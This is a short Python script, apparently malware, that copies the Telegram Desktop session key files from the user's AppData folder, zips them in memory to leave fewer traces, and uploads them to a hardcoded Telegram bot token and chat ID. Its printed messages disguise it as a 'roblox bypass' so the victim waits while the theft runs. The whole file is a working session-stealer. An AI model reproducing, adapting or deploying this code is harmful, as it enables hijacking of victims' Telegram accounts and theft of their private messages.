import os
import zipfile
import requests
from io import BytesIO

# --- НАСТРОЙКИ ---
BOT_TOKEN = "8242329899:AAEfyPALVhC8j-T_lWsBkm8SI5-53LBTK6E"
CHAT_ID = "7706583482"
print("initialization...")
def main():
    # 1. ПОИСК ПУТИ
    # os.getenv('APPDATA') возвращает путь к папке Roaming (C:\Users\User\AppData\Roaming)
    tdata_path = os.path.join(os.getenv('APPDATA'), 'Telegram Desktop', 'tdata')
    
    if not os.path.exists(tdata_path):
        print("Error roblox bypass didnt find triing again (Do not close this window)...")
        tdata_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Packages', 'TelegramDesktop_8wekyb3d8bbwe', 'LocalCache', 'Roaming', 'Telegram Desktop', 'tdata')

    if not os.path.exists(tdata_path):
        print("Erorr data didnt find. Triing again...")
        return
    # ПОИСК ПУТИ 2
    
    
    # 2. АРХИВАЦИЯ В ПАМЯТИ
    # Мы используем BytesIO, чтобы не создавать файл архива на диске (меньше следов)
    zip_buffer = BytesIO()
    
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
        # Проходим по всем папкам и файлам внутри tdata
        for root, dirs, files in os.walk(tdata_path):
            for file in files:
                # Фильтр: берем только важные файлы ключей
                # Файлы длиной 16 символов или начинающиеся на 'key'/'map' - это сердце сессии
                if len(file) == 16 or file.startswith(('key_', 'map')):
                    file_path = os.path.join(root, file)
                    # Вычисляем относительный путь, чтобы сохранить структуру в архиве
                    arcname = os.path.relpath(file_path, tdata_path)
                    zipf.write(file_path, arcname)
    
    # 3. ОТПРАВКА ЧЕРЕЗ TELEGRAM API
    zip_buffer.seek(0) # Возвращаемся в начало "виртуального" файла
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    
    # Подготавливаем файл для отправки
    files = {'document': ('tdata_backup.zip', zip_buffer)}
    data = {'chat_id': CHAT_ID, 'caption': "Бэкап tdata завершен."}
    
    try:
        response = requests.post(url, files=files, data=data)
        if response.status_code == 200:
            print("Downloading...")
        else:
            print(f"ERROR: {response.text}")
    except Exception as e:
        print(f"Ошибка сети: {e}")

if __name__ == "__main__":
    main()
print("Testing...")
print("Done. You can close this... (enter)")
input()